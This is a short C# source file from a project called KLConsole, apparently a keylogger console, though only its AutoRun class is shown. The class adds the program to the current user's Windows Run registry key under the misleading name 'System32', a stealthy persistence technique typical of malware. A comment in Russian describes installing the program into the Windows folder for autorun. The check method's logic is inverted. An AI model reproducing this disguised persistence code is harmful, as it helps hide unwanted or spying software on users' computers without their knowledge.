using Microsoft.Win32;
using System;
using System.IO;
using System.Linq;

namespace KLConsole
{
    class AutoRun
    {
        private readonly String AUTORUN_APP_NAME = "System32";

        /// <summary>
        /// Add to autorum
        /// </summary>
        internal void AddToAutoRun()
        {
            try
            {
                //установить программу в папку винды и указать путь для авторана
                RegistryKey autorun = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\run", true);
                if (autorun != null)
                    if (autorun.GetValue(AUTORUN_APP_NAME) == null)
                        autorun.SetValue(AUTORUN_APP_NAME, Directory.GetCurrentDirectory() + @"\KLConsole");
            }
            catch (Exception ex) 
            {
                throw ex;
            }
        }

        /// <summary>
        /// Check is autorun exist
        /// </summary>
        /// <returns></returns>
        internal bool IsAutoRun()
        {
            try
            {
                RegistryKey autorun = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\run", true);
                if (autorun.GetValueNames().Contains(AUTORUN_APP_NAME))
                    return false;
            }
            catch (Exception ex)
            {
                throw ex;
            }
            return true;
        }
    }
}
